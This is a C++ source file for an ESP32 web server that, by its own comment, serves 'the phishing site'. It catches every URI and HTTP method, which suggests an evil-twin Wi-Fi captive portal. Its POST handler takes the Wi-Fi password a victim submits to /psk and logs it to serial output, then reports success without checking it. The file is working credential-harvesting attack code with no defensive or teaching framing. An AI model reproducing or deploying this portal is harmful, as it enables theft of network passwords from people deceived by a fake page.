#include "WebServer.h"

#include <stdio.h>
#include <string.h>

#include "cJSON.h"
#include "esp_err.h"
#include "esp_http_server.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "page_index.h"

static httpd_config_t config = HTTPD_DEFAULT_CONFIG();
static httpd_handle_t server = NULL;

extern "C" bool httpdUriMatcher(const char *template_input, const char *uri,
                                size_t len) {
  const size_t tpl_len = strlen(template_input);
  size_t exact_match_chars = tpl_len;

  /* Check for trailing question mark and asterisk */
  const char last = tpl_len > 0 ? template_input[tpl_len - 1] : 0;
  const char prevlast = tpl_len > 1 ? template_input[tpl_len - 2] : 0;
  const bool asterisk = last == '*' || (prevlast == '*' && last == '?');
  const bool quest = last == '?' || (prevlast == '?' && last == '*');

  /* Minimum template_input string length must be:
   *      0 : if neither of '*' and '?' are present
   *      1 : if only '*' is present
   *      2 : if only '?' is present
   *      3 : if both are present
   *
   * The expression (asterisk + quest*2) serves as a
   * case wise generator of these length values
   */

  /* abort in cases such as "?" with no preceding character (invalid
   * template_input)
   */
  if (exact_match_chars < asterisk + quest * 2) {
    return false;
  }

  /* account for special characters and the optional character if "?" is used */
  exact_match_chars -= asterisk + quest * 2;

  if (len < exact_match_chars) {
    return false;
  }

  if (!quest) {
    if (!asterisk && len != exact_match_chars) {
      /* no special characters and different length - strncmp would return false
       */
      return false;
    }
    /* asterisk allows arbitrary trailing characters, we ignore these using
     * exact_match_chars as the length limit */
    return (strncmp(template_input, uri, exact_match_chars) == 0);
  } else {
    /* question mark present */
    if (len > exact_match_chars &&
        template_input[exact_match_chars] != uri[exact_match_chars]) {
      /* the optional character is present, but different */
      return false;
    }
    if (strncmp(template_input, uri, exact_match_chars) != 0) {
      /* the mandatory part differs */
      return false;
    }
    /* Now we know the URI is longer than the required part of template_input,
     * the mandatory part matches, and if the optional character is present, it
     * is correct. Match is OK if we have asterisk, i.e. any trailing characters
     * are OK, or if there are no characters beyond the optional character. */
    return asterisk || len <= exact_match_chars + 1;
  }
}

static esp_err_t webServerPskHandler(httpd_req_t *req) {
  if (strcmp(req->uri, "/psk") == 0) {
    char recv_buff[req->content_len + 1];
    printf("Receive content length: %zu\n", req->content_len);
    int ret = httpd_req_recv(req, recv_buff, req->content_len);

    if (ret <= 0) {
      /* 0 return value indicates connection closed */
      if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
        /* In case of timeout one can choose to retry calling
         * httpd_req_recv(), but to keep it simple, here we
         * respond with an HTTP 408 (Request Timeout) error */
        httpd_resp_send_408(req);
      }
      return ESP_FAIL;
    }
    printf("Content: %s\n", recv_buff);

    /* Parse JSON data using cJSON library */
    cJSON *root = cJSON_Parse(recv_buff);
    if (root == NULL) {
      /* Parsing failed, indicating that the data is not valid JSON */
      httpd_resp_send_500(req);
      return ESP_FAIL;
    }

    /* Check if 'psk' key exists and has a valid length */
    cJSON *psk = cJSON_GetObjectItem(root, "psk");
    httpd_resp_set_type(req, "application/json");
    size_t json_response_len = 16;
    char json_response[json_response_len];

    if (psk != NULL && cJSON_IsString(psk)) {
      // TODO: Verify that the password is correct by calculating the hash

      printf("{WEB,POST_PSK,%s,}\n", psk->valuestring);
      snprintf(json_response, json_response_len, "{\"success\":\"y\"}");
    } else {
      // Invalid password
      printf("{WEB,POST_INVALID_PSK,%s,}\n", psk->valuestring);
      snprintf(json_response, json_response_len, "{\"success\":\"n\"}");
    }
    httpd_resp_send(req, json_response, json_response_len);
    return ESP_OK;
  }

  printf("{WEB,SERVER_PSK,}\n");
  /* Send the HTML page instead */
  httpd_resp_set_type(req, "text/html");
  httpd_resp_set_hdr(req, "Content-Encoding", "gzip");
  httpd_resp_send(req, (const char *)page_index, page_index_len);
  return ESP_OK;
}

static esp_err_t webServerRootHandler(httpd_req_t *req) {
  printf("{WEB,SERVER_ROOT,}\n");
  /* Send the HTML page instead */
  httpd_resp_set_type(req, "text/html");
  httpd_resp_set_hdr(req, "Content-Encoding", "gzip");
  httpd_resp_send(req, (const char *)page_index, page_index_len);
  return ESP_OK;
}

/*
 * Hook all different kinds of HTTP methods so the server always responds with
 * the phishing site regardless of the HTTP method
 */

static httpd_uri_t root_get = {.uri = "/*",
                               .method = HTTP_GET,
                               .handler = webServerRootHandler,
                               .user_ctx = NULL};

static httpd_uri_t root_post = {.uri = "/*",
                                .method = HTTP_POST,
                                .handler = webServerPskHandler,
                                .user_ctx = NULL};

static httpd_uri_t root_put = {.uri = "/*",
                               .method = HTTP_PUT,
                               .handler = webServerRootHandler,
                               .user_ctx = NULL};

static httpd_uri_t root_delete = {.uri = "/*",
                                  .method = HTTP_DELETE,
                                  .handler = webServerRootHandler,
                                  .user_ctx = NULL};

static httpd_uri_t root_options = {.uri = "/*",
                                   .method = HTTP_OPTIONS,
                                   .handler = webServerRootHandler,
                                   .user_ctx = NULL};

static httpd_uri_t root_trace = {.uri = "/*",
                                 .method = HTTP_TRACE,
                                 .handler = webServerRootHandler,
                                 .user_ctx = NULL};

static httpd_uri_t root_head = {.uri = "/*",
                                .method = HTTP_HEAD,
                                .handler = webServerRootHandler,
                                .user_ctx = NULL};

static httpd_uri_t root_connect = {.uri = "/*",
                                   .method = HTTP_CONNECT,
                                   .handler = webServerRootHandler,
                                   .user_ctx = NULL};

static httpd_uri_t root_patch = {.uri = "/*",
                                 .method = HTTP_PATCH,
                                 .handler = webServerRootHandler,
                                 .user_ctx = NULL};

void hexStringToBytes(const char *hex_string, uint8_t *result) {
  int hex_length = strlen(hex_string);

  for (int i = 0; i < hex_length; i += 2) {
    vTaskDelay(25 / portTICK_PERIOD_MS);
    sscanf(hex_string + i, "%2hhx", &result[i / 2]);
  }
}

extern "C" void webServerStop() {
  ESP_ERROR_CHECK(httpd_stop(server));
  printf("{WEB,STOPPED,}\n");
}

extern "C" void webServerStart() {
  config.uri_match_fn = httpdUriMatcher;
  config.max_uri_handlers = 9;
  ESP_ERROR_CHECK(httpd_start(&server, &config));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_get));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_post));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_put));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_delete));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_options));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_trace));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_head));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_connect));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_patch));

  printf("{WEB,STARTED,}\n");
}